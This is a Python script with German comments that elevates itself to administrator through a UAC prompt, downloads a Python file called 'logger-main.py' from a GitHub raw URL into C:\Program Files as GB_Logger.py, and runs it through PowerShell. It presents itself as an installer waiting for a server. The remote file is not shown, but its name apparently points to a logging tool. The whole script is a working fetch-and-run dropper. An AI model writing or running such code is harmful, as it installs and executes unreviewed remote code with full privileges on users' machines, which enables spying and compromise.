import os
import sys
import ctypes
import subprocess
import requests

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    script = os.path.abspath(sys.argv[0])
    params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
    cmd = f'powershell -Command "Start-Process -FilePath \'{sys.executable}\' -ArgumentList \'{script} {params}\' -Verb RunAs"'
    subprocess.call(cmd, shell=True)

def download_file(url, dest):
    response = requests.get(url)
    response.raise_for_status()
    with open(dest, 'w', encoding='utf-8') as f:
        f.write(response.text)

def main():
    if not is_admin():
        print("Keine Administratorrechte. Starte neu mit Adminrechten...")
        run_as_admin()
        sys.exit()

    print("Mit Administratorrechten gestartet.")

    directory = r"C:\Program Files"
    if not os.path.exists(directory):
        print(f"Verzeichnis existiert nicht: {directory}")
        sys.exit(1)

    file_path = os.path.join(directory, "GB_Logger.py")

    url = "https://raw.githubusercontent.com/Crafii9YT/logger/refs/heads/main/logger-main.py"

    try:
        print("Downloading files...")
        download_file(url, file_path)
        print(f"files installed successfully! Waiting for server...")

        # PowerShell-Befehl vorbereiten - Pfad in einfache und doppelte Anführungszeichen korrekt einbetten
        # Powershell-Befehl: python "C:\Program Files\GB_Logger.py"; Read-Host -Prompt "Drücke Enter zum Schließen"
        ps_command = f'python "{file_path}"; Read-Host -Prompt "Drücke Enter zum Schließen"'

        # subprocess mit Liste: ['powershell.exe', '-NoExit', '-Command', ps_command]
        subprocess.Popen(['powershell.exe', '-NoExit', '-Command', ps_command])

    except Exception as e:
        print(f"Error occurred: {e}")

if __name__ == "__main__":
    main()
